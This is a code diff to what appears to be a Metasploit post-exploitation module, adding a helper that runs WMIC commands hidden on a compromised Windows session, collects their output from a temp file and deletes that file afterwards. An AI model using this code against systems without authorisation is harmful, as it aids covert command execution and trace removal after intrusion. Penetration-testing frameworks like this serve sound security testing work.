@@ -115,4 +115,42 @@ class Metasploit3 < Msf::Post
 		end
 		return is_dc_srv
 	end
+
+	def wmicexec(wmiccmd)
+		tmpout = ''
+		session.response_timeout=120
+		begin
+			tmp = session.fs.file.expand_path("%TEMP%")
+			wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
+			print_status "running command wmic #{wmiccmd}"
+			r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmiccmd}", nil, {'Hidden' => true})
+			sleep(2)
+			#Making sure that wmic finishes before executing next wmic command
+			prog2check = "wmic.exe"
+			found = 0
+			while found == 0
+				session.sys.process.get_processes().each do |x|
+					found =1
+					if prog2check == (x['name'].downcase)
+						sleep(0.5)
+						found = 0
+					end
+				end
+			end
+			r.close
+
+			# Read the output file of the wmic commands
+			wmioutfile = session.fs.file.new(wmicfl, "rb")
+			until wmioutfile.eof?
+				tmpout << wmioutfile.read
+			end
+			wmioutfile.close
+		rescue ::Exception => e
+			print_status("Error running WMIC commands: #{e.class} #{e}")
+		end
+		# We delete the file with the wmic command output.
+		c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
+		c.close
+		return tmpout
+	end
 end
